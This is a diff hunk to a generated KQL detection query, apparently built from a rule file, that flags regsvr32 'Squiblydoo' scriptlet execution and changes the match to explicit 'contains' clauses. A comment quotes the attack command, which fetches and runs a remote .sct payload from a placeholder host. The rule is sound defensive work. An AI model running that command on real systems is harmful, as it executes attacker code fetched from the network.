@@ -5,4 +5,4 @@
 //   regsvr32.exe /s /u /i:http://<host>/payload.sct scrobj.dll
 // source: rules/execution/regsvr32-scriptlet-squiblydoo.yml  (GENERATED, do not edit by hand)
 Event
-| where (((NewProcessName endswith "\\regsvr32.exe")) and ((CommandLine has_any (dynamic(["scrobj", "/i:http", ".sct"])))))
+| where (((NewProcessName endswith @"\regsvr32.exe")) and ((CommandLine contains @"scrobj" or CommandLine contains @"/i:http" or CommandLine contains @".sct")))
